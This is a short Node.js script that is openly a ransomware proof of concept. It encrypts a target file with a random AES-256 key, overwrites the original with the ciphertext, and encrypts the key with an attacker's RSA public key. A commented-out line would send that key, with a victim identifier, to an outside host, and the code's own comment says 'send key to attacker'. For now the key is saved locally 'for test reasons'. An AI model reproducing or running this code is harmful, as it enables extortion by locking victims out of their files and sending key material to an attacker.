const fs = require('fs');
const https = require('https');
const crypto = require('crypto');


const publicKeyBuffer = fs.readFileSync('./public.pem');

const AES_ALGORITHM = 'aes-256-ctr';
const AES_KEY_NAME = './aes-key';
const FILE_TO_ENCRYPT = './file.txt';


/**
* Function encrypts given input buffer using random AES-256 bit key.
* Returns key buffer and encrypted message buffer
*
* @param {Buffer} message
*/
function aesEncrypt (message) {
  const key = crypto.randomBytes(256 / 8);
  const iv = Buffer.alloc(16, 0);
  const aes = crypto.createCipheriv(AES_ALGORITHM, key, iv);
  const encryptedBuffer = aes.update(message);
  aes.final();

  return { message: encryptedBuffer, key }
}

/**
* Function encrypts message with given public key.
*
* @param {Buffer} publicKey
* @param {Buffer} message
*/
function rsaEncrypt (publicKey, message) {
  return crypto.publicEncrypt(publicKey, message);
}

// Encrypt file buffer with AES, get the encrypted buffer and encryption key back
const fileToEncrypt = fs.readFileSync(FILE_TO_ENCRYPT)
const { message: encryptedFileBuffer, key: encryptionKey } = aesEncrypt(fileToEncrypt);

// Overwrite file with encrypted bytes
fs.writeFileSync(FILE_TO_ENCRYPT, encryptedFileBuffer);

// Encrypt and send key to attacker (and save it to file, for test reasons)
const encryptedKey = rsaEncrypt(publicKeyBuffer, encryptionKey);
//https.get(`https://mortmortis.pl/iamnotyourmum/${encryptedKey}/uniqueKeyForVictimIdentification`);
fs.writeFileSync(AES_KEY_NAME, encryptedKey);